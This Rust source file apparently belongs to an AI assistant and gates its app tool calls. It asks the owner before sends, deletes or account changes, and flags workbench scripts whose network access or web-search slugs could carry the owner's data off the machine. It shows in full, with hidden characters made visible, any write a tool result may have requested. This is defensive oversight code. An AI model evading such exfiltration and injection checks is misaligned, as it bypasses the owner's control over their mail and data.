pub const MAIL_SEND_WORDS: &[&str] = &["SEND", "REPLY", "FORWARD"];

/// Whether a call sends email from Gmail: a multi-execute item of Gmail's whose slug sends, replies or forwards.
/// eve lite's mail goes only through Composio, so its question shows such a call whole with the room full eve gives
/// the owner's own Gmail (apps_mcp.WHOLE_ASK_CHARS, telegram._app_tool), never a clipped one.
pub fn sends_mail(name: &str, args: &Value) -> bool {
    if name != MULTI_EXECUTE {
        return false;
    }
    multi_execute_tools(args).into_iter().any(|tool| {
        let (toolkit, words) = slug_words(&str_or_empty(tool.get("tool_slug")));
        toolkit == "gmail" && words.iter().any(|w| MAIL_SEND_WORDS.contains(&w.as_str()))
    })
}

/// For eve lite: whether a workbench script the shared gate would run can still send the owner's data off the
/// Mac, or reads the owner's own mail or calendar. True when it calls a Gmail or Google Calendar slug (full eve
/// refuses those in a script; lite asks before a script computes on them) or a web-search or scraping toolkit
/// slug (data can leave in the URL). Scripts that import requests, os or sockets, alias the helper, hide a slug, or
/// name a pandas or numpy reader that fetches a URL already ask in every profile (`workbench_slugs` is None).
pub fn workbench_reaches_out_lite(code: Option<&Value>) -> bool {
    let Some(inner) = workbench_slugs(code) else { return true };
    inner
        .iter()
        .any(|slug| is_other_account(&slug_words(slug).0) || starts_with_web_toolkit(&py_strip(slug).to_uppercase()))
}

/// eve lite's verdict on one Composio call (EVE_PROFILE=lite; telegram._app_tool): [`decide`] with the owner's own
/// accounts allowed (`personal_direct=false`: Composio Connect is the only way to them), and the owner's yes before
/// a COMPOSIO_MANAGE_CONNECTIONS call unless [`manage_needs_yes`] proves it only checks or links. Reads still run,
/// sends and deletes still ask, and an explicit read-only policy still refuses. A workbench script that could
/// carry the owner's data off the Mac, or that reads their own mail or calendar, asks too
/// ([`workbench_reaches_out_lite`]): the whole-act question is None for a script, so that ask is a refusal.
pub fn decide_lite(name: &str, args: &Value, policy: Option<&Policy>) -> Decision {
    let decision = decide(name, args, policy, false);
    if decision.action != Action::Run {
        return decision;
    }
    if name == MANAGE_CONNECTIONS && manage_needs_yes(args) {
        return Decision::new(Action::Ask, vec![name.to_string()], "");
    }
    if name == WORKBENCH && workbench_reaches_out_lite(code_of(args)) {
        return Decision::new(Action::Ask, vec![name.to_string()], "");
    }
    decision
}

/// `_clip`: whitespace collapsed, then cut to `limit` characters with an ellipsis.
fn clip(text: &str, limit: usize) -> String {
    let text = py_split(text).join(" ");
    if chars(&text) <= limit {
        return text;
    }
    format!("{}…", char_prefix(&text, limit.saturating_sub(1)).trim_end_matches(is_space))
}

/// `_flat`: a string as it is, anything else as JSON.
fn flat(value: &Value) -> String {
    match value {
        Value::String(s) => s.clone(),
        Value::Null | Value::Bool(_) | Value::Number(_) => eve_apps_mcp::py::dumps(value, true),
        other => eve_apps_mcp::py::dumps(other, false),
    }
}

fn pairs(arguments: Option<&Value>, value_clip: Option<usize>) -> String {
    let Some(Value::Object(arguments)) = arguments else { return String::new() };
    arguments
        .iter()
        .map(|(k, v)| {
            let shown = match value_clip {
                None => flat(v),
                Some(limit) => clip(&flat(v), limit),
            };
            format!("{k}: {shown}")
        })
        .collect::<Vec<_>>()
        .join(", ")
}

fn describe(name: &str, args: &Value, value_clip: Option<usize>) -> String {
    let mut parts: Vec<String> = Vec::new();
    let inner = if name == WORKBENCH { consequential_slugs(name, args) } else { Vec::new() };
    if name == MULTI_EXECUTE {
        let tools = multi_execute_tools(args);
        let mut asked: Vec<&Map<String, Value>> =
            tools.iter().copied().filter(|t| !is_read_only(&str_or_empty(t.get("tool_slug")))).collect();
        if asked.is_empty() {
            asked = tools;
        }
        for tool in asked {
            let slug = match tool.get("tool_slug") {
                Some(v) if eve_tool_gate::py_truthy(v) => eve_tool_gate::py_str(v),
                _ => "a tool".to_string(),
            };
            let p = pairs(tool.get("arguments"), value_clip);
            let mut account = py_strip(&str_or_empty(tool.get("account"))).to_string();
            if !account.is_empty() {
                if let Some(limit) = value_clip {
                    account = clip(&account, limit);
                }
            }
            let slug_on = if account.is_empty() { slug } else { format!("{slug} on {account}") }; // which account it writes to
            parts.push(if p.is_empty() { slug_on } else { format!("{slug_on} with {p}") });
        }
    } else if name == WORKBENCH && !inner.is_empty() && inner != [name.to_string()] {
        let mut unique: Vec<&String> = Vec::new();
        for s in &inner {
            if !unique.contains(&s) {
                unique.push(s);
            }
        }
        let joined: Vec<&str> = unique.iter().map(|s| s.as_str()).collect();
        // the tools it calls, not the code
        parts.push(format!("{} from a workbench script", joined.join(", ")));
    } else {
        let p = pairs(Some(args), value_clip);
        parts.push(if p.is_empty() { name.to_string() } else { format!("{name} with {p}") });
    }
    format!("Run {}?", parts.join("; and "))
}

/// One plain line the owner can answer yes or no to. Values clipped, the line clipped, no emoji.
pub fn describe_for_confirmation(name: &str, args: &Value) -> String {
    let line = describe(name, args, Some(VALUE_CLIP));
    if chars(&line) > LINE_CLIP {
        let without_mark = char_prefix(&line, chars(&line) - 1);
        return format!("{}?", clip(without_mark, LINE_CLIP - 1));
    }
    line
}

/// The same line with nothing clipped, or None when it is longer than `limit`: a write a tool result may have
/// asked for is shown whole or not asked about at all (tool_gate; v3 safety review). A workbench script's
/// arguments are code, not shown in a question, so it is never shown whole: None.
pub fn describe_whole(name: &str, args: &Value, limit: usize) -> Option<String> {
    if name == WORKBENCH {
        return None;
    }
    // hidden and bidi characters shown as [U+XXXX], never as nothing (tool_gate.visible; round-4 review)
    let line = py_split(&eve_tool_gate::visible(&describe(name, args, None))).join(" ");
    (chars(&line) <= limit).then_some(line)
}

// -- the bridge: one session, resumed across restarts --

fn read_state(path: &Path) -> Map<String, Value> {
    let Ok(text) = std::fs::read_to_string(path) else { return Map::new() };
    match serde_json::from_str::<Value>(&text) {
        Ok(Value::Object(map)) => map,
        _ => Map::new(),
    }
}

fn write_state(path: &Path, state: &Map<String, Value>) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    let mut tmp_name = path.file_name().map(|n| n.to_os_string()).unwrap_or_default();
    tmp_name.push(".tmp");
    let tmp = path.with_file_name(tmp_name);
    {
        let mut f = std::fs::OpenOptions::new().write(true).create(true).truncate(true).mode(0o600).open(&tmp)?;
        f.write_all(eve_apps_mcp::py::dumps_indent2(&Value::Object(state.clone())).as_bytes())?;
        f.write_all(b"\n")?;
    }
    std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600))?;
    std::fs::rename(&tmp, path)
}

fn io_error(e: &std::io::Error) -> ComposioError {
    let kind = match e.kind() {
        std::io::ErrorKind::PermissionDenied => "PermissionError",
        std::io::ErrorKind::NotFound => "FileNotFoundError",
        std::io::ErrorKind::AlreadyExists => "FileExistsError",
        _ => "OSError",
    };
    ComposioError::new(kind, e.to_string())
}

/// `_as_dict`: a mapping as it is, anything else under "data".
fn as_dict(result: Value) -> Map<String, Value> {
    match result {
        Value::Object(map) => map,
        other => Map::from_iter([("data".to_string(), other)]),
    }
}

/// One of the owner's connected accounts, as [`ComposioBridge::connected_accounts`] lists it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConnectedAccount {
    /// Lowercased.
    pub toolkit: String,
    pub id: String,
    pub alias: String,
    pub status: String,
}

impl ConnectedAccount {
    /// The Python dict: `{"toolkit", "id", "alias", "status"}`.
    pub fn to_value(&self) -> Value {
        json!({"toolkit": self.toolkit, "id": self.id, "alias": self.alias, "status": self.status})
    }
}

/// Makes the SDK client (`_make_client`); the default is [`HttpComposioClient::from_env`].
pub type ClientFactory = Arc<dyn Fn() -> Result<Arc<dyn ComposioClient>, ComposioError> + Send + Sync>;

#[derive(Default)]
struct Inner {
    client: Option<Arc<dyn ComposioClient>>,
    session: Option<Arc<dyn ComposioSession>>,
    tools: Vec<Map<String, Value>>,
    /// toolkit slug -> the owner's ACTIVE accounts on it, each by alias (or id when it has none); filled by
    /// allowed_toolkits. Two or more on one toolkit puts the session in multi-account mode (start).
    accounts: IndexMap<String, Vec<String>>,
    /// "all" keeps these out.
    disabled: Vec<String>,
}

/// The owner's Composio session, wrapped so nothing in here fails into the chat loop.
pub struct ComposioBridge {
    pub config: ComposioConfig,
    client_factory: Option<ClientFactory>,
    inner: Mutex<Inner>,
}

fn sorted_union(a: &[&str], b: &[&str]) -> Vec<String> {
    let set: BTreeSet<String> = a.iter().chain(b.iter()).map(|s| s.to_string()).collect();
    set.into_iter().collect()
}

impl ComposioBridge {
    pub fn new(config: ComposioConfig, client_factory: Option<ClientFactory>) -> Self {
        let inner = Inner { disabled: sorted_union(DIRECT_TOOLKITS, OTHER_ACCOUNT_TOOLKITS), ..Inner::default() };
        ComposioBridge { config, client_factory, inner: Mutex::new(inner) }
    }

    pub fn started(&self) -> bool {
        self.inner.lock().session.is_some()
    }

    pub fn session_id(&self) -> String {
        self.inner.lock().session.as_ref().map(|s| s.session_id()).unwrap_or_default()
    }

    fn client(&self) -> Option<Arc<dyn ComposioClient>> {
        self.inner.lock().client.clone()
    }

    fn make_client(&self) -> Result<Arc<dyn ComposioClient>, ComposioError> {
        if let Some(factory) = &self.client_factory {
            return factory();
        }
        // int(timeout_secs), as the SDK is given it
        let t = self.config.timeout_secs;
        if t.is_nan() {
            return Err(ComposioError::new("ValueError", "cannot convert float NaN to integer"));
        }
        if t.is_infinite() {
            return Err(ComposioError::new("OverflowError", "cannot convert float infinity to integer"));
        }
        Ok(Arc::new(HttpComposioClient::from_env(t.trunc() as i64)?))
    }

    /// Resume the persisted session for this owner, or create one and persist it. Fails only if the client
    /// cannot create a session at all (no key, no network): the caller decides what that means.
    pub async fn start(&self) -> Result<(), ComposioError> {
        let client = self.make_client()?;
        self.inner.lock().client = Some(client.clone());
        let state = read_state(&self.config.state_path);
        let stored = str_or_empty(state.get("session_id"));
        // Which toolkits a session has is fixed when it is made, so one made with another list is not resumed.
        let allowed = self.allowed_toolkits().await;
        // "all": no allow-list, but the direct apps and a Gmail/Calendar with no other account are disabled
        // (Lean AppsPolicy P3, 2026-10-05: with no limit at all, Drive, GitHub and the personal Gmail joined).
        let toolkits = match &allowed {
            Some(list) => json!({"enable": list}),
            None => json!({"disable": self.inner.lock().disabled.clone()}),
        };
        let recorded = match &allowed {
            Some(list) => json!(list), // the state file's form for a list
            None => toolkits.clone(),
        };
        let multi = self.multi_account();
        // Multi-account mode with explicit selection: with two accounts on one app, Composio refuses a call that
        // does not name its account rather than picking one silently. Fixed at creation, like the toolkits.
        let extra = multi.then(|| json!({"enable": true, "require_explicit_selection": true}));
        let mut session: Option<Arc<dyn ComposioSession>> = None;
        if !stored.is_empty()
            && state.get("user_id") == Some(&Value::from(self.config.user_id.as_str()))
            && state.get("toolkits") == Some(&recorded)
            && truthy(state.get("multi_account")) == multi
        {
            match client.use_session(&stored).await {
                Ok(s) => {
                    tracing::info!("composio: resumed the session for {}", self.config.user_id);
                    session = Some(s);
                }
                Err(e) => tracing::warn!("composio: stored session unusable ({}); creating a fresh one", e.kind),
            }
        }
        let session = match session {
            Some(s) => s,
            None => {
                let s = client.create_session(&self.config.user_id, &toolkits, extra.as_ref()).await?;
                let mut st = Map::new();
                st.insert("user_id".into(), Value::from(self.config.user_id.as_str()));
                st.insert("session_id".into(), Value::from(s.session_id()));
                st.insert("toolkits".into(), recorded.clone());
                st.insert("multi_account".into(), Value::Bool(multi));
                write_state(&self.config.state_path, &st).map_err(|e| io_error(&e))?;
                tracing::info!("composio: created a session for {}", self.config.user_id);
                s
            }
        };
        self.inner.lock().session = Some(session.clone());
        let tools = Self::load_tools(&session).await?;
        self.inner.lock().tools = tools;
        Ok(())
    }

    /// The session's allow-list: the configured toolkits plus every one the owner has connected (an app connected
    /// outside this list still works), sorted; None when unlimited ("all"; `disabled` then holds what is kept out).
    /// A failed lookup of the connected accounts leaves the configured list alone. Also records each toolkit's
    /// accounts.
    ///
    /// Gmail and Calendar stay in only with an ACTIVE account whose alias, stripped and lowercased as `decide`
    /// reads an account, is neither empty nor PRIMARY_ALIAS; even when EVE_COMPOSIO_TOOLKITS names them (Lean
    /// AppsPolicy P3, 2026-10-05: "Personal" joined, and so did a configured Gmail with only the personal account,
    /// in a session that then did not demand an account per call).
    async fn allowed_toolkits(&self) -> Option<Vec<String>> {
        let mut allowed: BTreeSet<String> = self.config.toolkits.iter().flatten().cloned().collect();
        let mut accounts: IndexMap<String, Vec<String>> = IndexMap::new();
        let listing = match self.client() {
            Some(client) => client.list_connected_accounts(std::slice::from_ref(&self.config.user_id)).await,
            None => Err(ComposioError::new("AttributeError", "'NoneType' object has no attribute 'connected_accounts'")),
        };
        match listing {
            Ok(items) => {
                for item in items {
                    let data = as_dict(item);
                    let slug = match data.get("toolkit") {
                        Some(Value::Object(kit)) => kit.get("slug").cloned(),
                        other => other.cloned(),
                    };
                    let Some(Value::String(slug)) = slug else { continue };
                    let kit = slug.to_lowercase();
                    if slug.is_empty()
                        || data.get("status") != Some(&Value::from("ACTIVE"))
                        || DIRECT_TOOLKITS.contains(&kit.as_str())
                    {
                        continue;
                    }
                    let alias = str_or_empty(data.get("alias"));
                    let alias_key = py_strip(&alias).to_lowercase();
                    if is_other_account(&kit) && (alias_key.is_empty() || alias_key == PRIMARY_ALIAS) {
                        continue; // the personal (or an unnamed) account: that one is direct
                    }
                    // a direct app's accounts are not Composio's: they never make the session multi-account
                    allowed.insert(kit.clone());
                    let name = if alias.is_empty() { str_or_empty(data.get("id")) } else { alias };
                    if !name.is_empty() {
                        accounts.entry(kit).or_default().push(name);
                    }
                }
            }
            Err(e) => {
                tracing::info!("composio: connected accounts not listed ({}); the configured toolkits only", e.kind)
            }
        }
        for names in accounts.values_mut() {
            names.sort();
        }
        let unheld: Vec<&str> =
            OTHER_ACCOUNT_TOOLKITS.iter().copied().filter(|k| !accounts.contains_key(*k)).collect(); // no other account to hold
        {
            let mut inner = self.inner.lock();
            inner.accounts = accounts;
            inner.disabled = sorted_union(DIRECT_TOOLKITS, &unheld);
        }
        self.config.toolkits.as_ref()?;
        for kit in WEB_TOOLKITS.iter().chain(DIRECT_TOOLKITS.iter()).chain(unheld.iter()) {
            allowed.remove(*kit);
        }
        Some(allowed.into_iter().collect())
    }

    /// Some toolkit has two or more of the owner's accounts connected, or holds an other-account app (its personal
    /// connection is still in Composio, so every call must name its account).
    pub fn multi_account(&self) -> bool {
        self.inner.lock().accounts.iter().any(|(k, v)| v.len() > 1 || is_other_account(k))
    }

    /// For the brain, only while some toolkit has more than one account: which accounts there are and which one
    /// each kind of call goes to. Empty otherwise, so a one-account prompt is unchanged.
    pub fn accounts_note(&self) -> String {
        let accounts: BTreeMap<String, Vec<String>> =
            self.inner.lock().accounts.iter().map(|(k, v)| (k.clone(), v.clone())).collect();
        let multi: Vec<(&String, &Vec<String>)> =
            accounts.iter().filter(|(k, v)| v.len() > 1 && !is_other_account(k)).collect();
        let other: Vec<(&String, &Vec<String>)> = accounts.iter().filter(|(k, _)| is_other_account(k)).collect();
        if multi.is_empty() && other.is_empty() {
            return String::new();
        }
        let mut lines: Vec<String> = Vec::new();
        if !multi.is_empty() {
            lines.push(
                "More than one account is connected for some apps. Every COMPOSIO_MULTI_EXECUTE_TOOL item for these \
                 apps must set \"account\" to one of the names below:"
                    .to_string(),
            );
            lines.extend(multi.iter().map(|(kit, names)| format!("- {kit}: {}", names.join(", "))));
            lines.push(format!(
                "To read (a calendar, mail, files), read every account of that app and say which account each result \
                 came from. To create, change or delete, use the account named \"{PRIMARY_ALIAS}\" unless the owner \
                 names another one."
            ));
        }
        if !other.is_empty() {
            lines.push(
                "Through COMPOSIO, these apps hold only the owner's other accounts, never their own (their own is \
                 reached with its own tools). Every COMPOSIO_MULTI_EXECUTE_TOOL item for them sets \"account\" to one \
                 of these names:"
                    .to_string(),
            );
            for (kit, names) in &other {
                let label = match kit.as_str() {
                    "gmail" => "Gmail",
                    "googlecalendar" => "Google Calendar",
                    k => k,
                };
                lines.push(format!("- {label} ({kit}): {}", names.join(", ")));
            }
            lines.push(
                "When the owner says \"work\" mail or calendar, it is that account; for \"my mail\" or \"my calendar\" \
                 without saying which, read both and say which account each result came from."
                    .to_string(),
            );
        }
        lines.join("\n")
    }

    async fn load_tools(session: &Arc<dyn ComposioSession>) -> Result<Vec<Map<String, Value>>, ComposioError> {
        let raw = session.tools().await?;
        let out: Vec<Map<String, Value>> = raw
            .into_iter()
            .map(as_dict)
            .filter(|t| t.get("type") == Some(&Value::from("function")) && truthy(t.get("name")))
            .collect();
        tracing::info!("composio: {} tool{}", out.len(), if out.len() == 1 { "" } else { "s" });
        Ok(out)
    }

    pub fn tools(&self) -> Vec<Map<String, Value>> {
        self.inner.lock().tools.clone()
    }

    pub fn names(&self) -> BTreeSet<String> {
        self.inner.lock().tools.iter().map(|t| eve_tool_gate::py_str(&t["name"])).collect()
    }

    // -- reads for Updates (updates_composio): one app tool on one connected account, never a write --

    /// The client is up (`start` got as far as making it), so [`Self::connected_accounts`] and
    /// [`Self::read_tool`] can run. Composio not configured, or the feature off: false.
    pub fn can_read(&self) -> bool {
        self.client().is_some()
    }

    /// The owner's connected accounts as Composio lists them now, the toolkit lowercased, DIRECT_TOOLKITS left out.
    /// Fails when the listing fails (the caller counts that as a failed read). Ids and aliases are never logged.
    pub async fn connected_accounts(&self) -> Result<Vec<ConnectedAccount>, ComposioError> {
        let Some(client) = self.client() else {
            return Err(ComposioError::new("RuntimeError", "composio is not started"));
        };
        let items = client.list_connected_accounts(std::slice::from_ref(&self.config.user_id)).await?;
        let mut out = Vec::new();
        for item in items {
            let data = as_dict(item);
            let slug = match data.get("toolkit") {
                Some(Value::Object(kit)) => kit.get("slug").cloned(),
                other => other.cloned(),
            };
            let Some(Value::String(slug)) = slug else { continue };
            if slug.is_empty() || DIRECT_TOOLKITS.contains(&slug.to_lowercase().as_str()) || !truthy(data.get("id")) {
                continue;
            }
            out.push(ConnectedAccount {
                toolkit: slug.to_lowercase(),
                id: eve_tool_gate::py_str(&data["id"]),
                alias: str_or_empty(data.get("alias")),
                status: str_or_empty(data.get("status")),
            });
        }
        Ok(out)
    }

    /// Run ONE app tool that only reads on the connected account `account_id` (an id from
    /// [`Self::connected_accounts`]), outside the chat's session, so the whole answer comes back (the session's
    /// multi-execute answers with a preview) and the account is the one named, never a default. Never fails:
    /// `{"ok": false, "reason"}` on a failure. A slug that writes ([`is_read_only`], [`consequential_slugs`]) is
    /// refused before anything is sent, as is a direct app's slug and an other-account app's call with no account.
    pub async fn read_tool(&self, slug: &str, arguments: &Map<String, Value>, account_id: &str) -> Map<String, Value> {
        let slug = py_strip(slug).to_string();
        let toolkit = slug_words(&slug).0;
        if !is_read_only(&slug) || !consequential_slugs(MULTI_EXECUTE, &json!({"tools": [{"tool_slug": slug}]})).is_empty()
        {
            return failure(format!("{slug} is not a read"));
        }
        if DIRECT_TOOLKITS.contains(&toolkit.as_str()) || py_strip(account_id).is_empty() {
            return failure(format!("{slug} needs one of the owner's Composio accounts"));
        }
        let Some(client) = self.client() else { return failure("composio is not started".to_string()) };
        let result = client.execute_tool(&slug, arguments, &self.config.user_id, account_id).await;
        let mut out = match result {
            Ok(v) => as_dict(v),
            Err(e) => {
                // the type only: answers may hold mail text
                tracing::warn!("composio: {} read failed: {}", slug, e.kind);
                return failure(format!("{}: {}", e.kind, clip(&e.message, 200)));
            }
        };
        let ok = out.get("successful") != Some(&Value::Bool(false)) && !truthy(out.get("error"));
        out.insert("ok".into(), Value::Bool(ok));
        out
    }

    /// Never fails: a failure is a map the model can read and tell the owner about.
    pub async fn execute(&self, name: &str, args: &Map<String, Value>) -> Map<String, Value> {
        let Some(session) = self.inner.lock().session.clone() else {
            return failure("composio is not started".to_string());
        };
        let mut out = match session.execute(name, args).await {
            Ok(v) => as_dict(v),
            Err(e) => {
                // the type only: arguments may hold mail text
                tracing::warn!("composio: {} failed: {}", name, e.kind);
                return failure(format!("{}: {}", e.kind, clip(&e.message, 200)));
            }
        };
        if !out.contains_key("ok") {
            let ok = !truthy(out.get("error"));
            out.insert("ok".into(), Value::Bool(ok));
        }
        out
    }
}

fn failure(reason: String) -> Map<String, Value> {
    Map::from_iter([("ok".to_string(), Value::Bool(false)), ("reason".to_string(), Value::from(reason))])
}

#[cfg(test)]
mod tests;
